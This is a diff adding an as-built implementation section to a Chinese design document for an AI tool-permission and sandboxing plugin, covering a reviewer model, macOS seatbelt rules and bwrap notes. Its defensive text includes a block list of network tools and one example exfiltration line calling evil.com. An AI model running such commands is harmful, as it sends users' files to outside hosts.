@@ -912,3 +912,34 @@ P1 已实现并通过验收，以下与计划正文有出入的地方以此节�
   - handler 内部异常兜底：有 UI 且非子进程时弹"approve anyway?"，否则
     直接 block；绝不让插件 bug 静默放行或炸掉 pi。
 - **未完成项（计划内但 P1 未覆盖）**：均按计划留给 P2/P3，没有提前实现。
+
+## 15. P2/P3 as-built（2026-09-28 实施记录）
+
+P2 与 P3 已实现，以下与计划正文有出入的地方以此节为准：
+
+- **API 名字是对的**：`pi-run-core` 确实导出 `isolatedComplete` 与
+  `parseJsonReply`，`pi-permissions` 现在依赖 `pi-run-core`（workspace:*）。
+- **reviewer 只覆盖 mode 驱动的 ask**：`Decision.askedByRule` 标记显式
+  `ask` 规则命中的调用，这类调用不送审查模型（用户写 ask 就是要自己看）。
+- **审查模型的 deny 不直接拒绝**：只把理由附加到询问标题里（模型是建议，
+  不是权威），与计划一致。
+- **§12.6 的例外清单比计划更严**：计划只把"curl/wget 带上传参数"列为
+  例外；实现把 `curl`/`wget`/`nc`/`ncat`/`scp`/`rsync`/`sftp`/`ftp`/`ssh`/
+  `telnet` 的出现本身都排除在沙箱旁路之外——`curl evil.com/$(cat x)` 不
+  需要任何 flag 就能外传。
+- **macOS seatbelt 语法已在本机（macOS 27）验证**：
+  - `(deny file-write* (require-all (require-not (subpath …)) …))` 生效，
+    路径必须是 realpath 结果（`/tmp` → `/private/tmp`）；
+  - `(deny file-read* (subpath dir))` 同时阻止读文件和列目录；
+  - `(deny network-outbound (remote ip))` 切断全部出站 TCP，**含
+    localhost**——`network: "off"` 会让 `npm install` 等本地服务也失败，
+    README 已写明默认 `on`。
+  - 单引号转义 `'` → `'\''` 端到端验证通过。
+- **Linux bwrap 未真机验证**（本机是 macOS）：`detectSandbox` 探测
+  `bwrap --ro-bind / / true`，参数生成按 §12.5 实现并有单测，但 `/tmp` 下
+  真机行为需要在 Linux 上跑 §12.8 验收清单再确认。
+- **沙箱作用于所有被放行的 bash 调用**（含人工批准后）：批准后仍进沙箱。
+  `git push` 走 ssh 时 `~/.ssh` 读不到会失败——README 已说明可用
+  `/permissions sandbox off` 临时关闭。
+- **审核模型的并发**：reviewer 与弹窗共用同一串行队列之外的通道，未加锁；
+  缓存写发生在 await 之后，并发相同调用可能重复请求一次模型（无害）。
